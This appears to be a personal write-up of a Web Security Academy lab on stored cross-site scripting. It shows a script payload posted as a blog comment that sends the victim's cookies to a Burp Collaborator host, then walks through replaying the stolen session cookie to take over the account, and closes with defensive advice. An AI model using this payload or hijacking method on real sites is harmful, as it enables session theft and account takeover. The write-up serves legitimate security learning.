# Cross-Site Scripting (XSS) – Exploiting XSS to Steal Cookies
(Web Security Academy)

This lab demonstrates how a **stored cross-site scripting (XSS)** vulnerability can be escalated into a **full session hijacking attack** by stealing a victim’s session cookie and impersonating them.

---

## Lab: Exploiting Cross-Site Scripting to Steal Cookies

**Category:** Cross-site scripting  
**Type:** Stored XSS  
**Exploitation:** Session hijacking  
**Level:** Practitioner  
**Status:** Solved  

---

## What This Lab Is About

This lab contains a **stored XSS vulnerability** in the blog comment functionality.

Key conditions:

- A simulated **victim user automatically views all comments**
- JavaScript injected into comments executes in the victim’s browser
- Victim cookies are **not protected by HttpOnly**
- Burp Collaborator must be used to exfiltrate data

The goal is to:

1. Steal the victim’s session cookie
2. Reuse the cookie to impersonate the victim
3. Access the victim’s account and solve the lab

---

## Attack Chain Overview

1. Inject stored XSS payload into a blog comment
2. Victim loads the comment
3. JavaScript executes in victim’s browser
4. Victim’s session cookie is sent to attacker
5. Attacker reuses the stolen cookie
6. Victim account is fully compromised

---

## Vulnerable Flow

- **Source:** Blog comment input
- **Sink:** Stored HTML rendered to other users
- **Execution Context:** Victim’s browser
- **Sensitive Data:** `document.cookie`

---

## Payload Used

```html
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
});
</script>
````

---

## Steps I Followed

1. Opened **Burp Suite Professional**
2. Navigated to the **Collaborator** tab
3. Clicked **Copy to clipboard** to generate a unique Collaborator payload
4. Posted the malicious script as a blog comment
5. Waited for the simulated victim to view the comment
6. Returned to the Collaborator tab
7. Clicked **Poll now**
8. Observed an incoming HTTP POST request
9. Extracted the victim’s session cookie from the request body
10. Reloaded the blog using Burp Proxy / Repeater
11. Replaced my own session cookie with the stolen one
12. Sent the request
13. Successfully accessed the victim’s account page
14. Lab marked as solved

---

## Why This Worked

* Stored XSS executes automatically for all viewers
* `document.cookie` was accessible to JavaScript
* Cookies were not protected with `HttpOnly`
* No output encoding or sanitization was applied
* Burp Collaborator allowed out-of-band data exfiltration

---

## Impact

* Full session hijacking
* Account takeover
* Privilege escalation
* Unauthorized access to sensitive data
* Complete compromise of victim trust

---

## Key Lessons Learned

* Stored XSS is more dangerous than reflected XSS
* Any JavaScript execution can lead to session theft
* Cookies must be protected with `HttpOnly`
* XSS combined with weak cookie protections is critical
* Out-of-band channels are powerful for stealthy attacks

---

## Defensive Takeaways

To prevent this attack:

* Always encode untrusted input before rendering
* Use `HttpOnly` and `Secure` cookie flags
* Implement a strict Content Security Policy (CSP)
* Avoid rendering raw HTML from user input
* Monitor for unexpected outbound requests

---

## Final Summary

* Stored XSS vulnerability in blog comments
* JavaScript executed in victim’s browser
* Victim session cookie exfiltrated via Burp Collaborator
* Cookie reused to impersonate the victim
* Real-world example of XSS → account takeover

 
 
